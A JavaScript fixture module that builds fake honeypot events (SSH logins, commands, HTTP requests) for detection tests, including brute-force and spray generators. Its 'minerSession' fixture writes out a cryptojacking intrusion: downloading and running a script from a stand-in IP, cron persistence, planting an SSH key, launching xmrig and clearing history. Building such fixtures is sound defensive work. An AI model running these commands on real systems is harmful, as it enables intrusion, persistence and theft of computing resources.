// Fixture builders for correlation/agent tests. Shapes match `events` rows.

let clock = Date.parse("2026-10-01T10:00:00Z");
const tick = () => new Date((clock += 1000));

/** @param {string} username @param {string} password @param {boolean} [success] */
export const sshAuth = (username, password, success = false) => ({
  protocol: "ssh",
  event_type: "auth_attempt",
  ts: tick(),
  username,
  password,
  auth_method: "password",
  auth_success: success,
  session_id: "s1"
});

/** @param {string} command */
export const sshCmd = (command) => ({
  protocol: "ssh",
  event_type: "command",
  ts: tick(),
  username: "root",
  command,
  session_id: "s1"
});

/** @param {string} path @param {Partial<Record<string, any>>} [extra] */
export const httpReq = (path, extra = {}) => ({
  protocol: "http",
  event_type: "request",
  ts: tick(),
  http_method: "GET",
  http_path: path,
  user_agent: "Mozilla/5.0 zgrab/0.x",
  http_headers: {},
  ...extra
});

/** n failed logins for one username with distinct passwords */
export const bruteForce = (/** @type {number} */ n, username = "root") =>
  Array.from({ length: n }, (_, i) => sshAuth(username, `pass${i}`));

/** n usernames sprayed with a single password */
export const spray = (/** @type {number} */ n, password = "Winter2026!") =>
  Array.from({ length: n }, (_, i) => sshAuth(`user${i}`, password));

/** A typical cryptojacking bot session. */
export const minerSession = () => [
  ...bruteForce(3),
  sshAuth("root", "123456", true),
  sshCmd("uname -a; nproc"),
  sshCmd("cd /tmp && wget http://203.0.113.200/x.sh && chmod +x x.sh && ./x.sh"),
  sshCmd('(crontab -l; echo "*/5 * * * * /tmp/x.sh") | crontab -'),
  sshCmd('echo "ssh-rsa AAAAB3Nza... bot" >> ~/.ssh/authorized_keys'),
  sshCmd("./xmrig -o stratum+tcp://pool.example:3333 -u wallet"),
  sshCmd("history -c")
];
